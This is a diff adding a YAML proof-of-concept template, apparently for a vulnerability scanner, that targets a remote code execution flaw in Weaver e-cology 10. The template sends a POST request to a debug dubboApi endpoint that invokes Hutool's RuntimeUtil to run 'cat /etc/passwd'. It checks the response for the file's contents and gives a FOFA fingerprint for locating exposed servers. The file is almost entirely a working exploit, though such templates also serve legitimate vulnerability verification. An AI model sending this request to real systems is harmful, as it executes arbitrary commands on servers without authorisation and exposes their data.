@@ -1,0 +1,18 @@
+id: poc-yaml-weaver-e-cology-10-method-rce
+info:
+  name: 泛微 e-cology10 method 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: e-cology
+  fofa: icon_hash="-1619753057"
+requests:
+- method: POST
+  path: /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr
+  headers:
+    Content-Type: application/json
+  data: '[["cat /etc/passwd"]]  '
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<") && contains(content_type,"application/json")
+variables: {}
+transport: http
